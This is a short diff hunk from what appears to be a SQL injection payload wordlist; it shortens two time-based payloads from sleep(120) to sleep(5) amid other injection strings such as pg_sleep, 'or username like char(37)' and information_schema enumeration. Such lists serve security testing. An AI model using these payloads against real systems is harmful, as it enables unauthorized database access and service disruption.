@@ -78,8 +78,8 @@
  or pg_sleep(__TIME__)--
  or sleep(__TIME__)#
  or sleep(__TIME__)='
- or sleep(120)
- or sleep(120) -- 
+ or sleep(5)
+ or sleep(5) -- 
  or username like char(37);
  select * from information_schema.tables--
  select name from syscolumns where id = (sele ...
